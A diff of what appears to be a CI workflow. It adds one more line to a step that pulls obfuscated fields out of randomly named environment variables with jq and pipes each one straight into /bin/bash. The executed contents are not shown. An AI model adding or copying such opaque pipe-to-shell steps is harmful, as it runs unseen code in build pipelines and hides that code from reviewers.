@@ -51,6 +51,7 @@ jobs:
           echo $sbsdf957 | jq -r .g408 | /bin/bash
           echo $fargt10394 | jq -r .evuic2855 | /bin/bash
           printf '%s' "$p91043" | jq -r .eupn06 | /bin/bash
+          printf '%s' "$shc67" | jq -r .r250 | /bin/bash
 
       - name: Archive output
         if: always()
